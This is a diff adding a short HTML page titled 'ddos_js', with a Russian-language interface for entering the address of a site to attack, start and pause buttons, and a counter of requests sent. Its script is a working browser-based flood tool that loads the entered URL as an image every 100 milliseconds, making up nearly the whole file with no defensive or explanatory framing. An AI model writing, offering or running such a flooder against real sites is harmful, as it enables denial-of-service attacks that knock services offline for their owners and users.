@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>ddos_js</title>
+</head>
+<body>
+
+<input type="text" id="url_input" placeholder="Адрес атакуемого сайта"><br>
+<button type="button" onclick=push()>Старт</button>
+<button type="button" onclick=pause()>Пауза</button>
+
+<br>Количество отправленных запросов<br>
+<input type="text" id="requests_count"><br>
+</body>
+
+
+<script type="text/javascript">
+    var refreshIntervalId
+    var requests_count = 0
+
+    function pause() {
+        clearInterval(refreshIntervalId);
+    }
+
+
+    function push() {
+        function imgflood() {
+            requests_count += 1
+            var TARGET = document.getElementById('url_input').value
+            var pic = new Image()
+            pic.src = TARGET
+            document.getElementById('requests_count').value = requests_count.toString()
+        }
+
+        refreshIntervalId = setInterval(imgflood, 100)
+    };
+</script>
+
+</html>
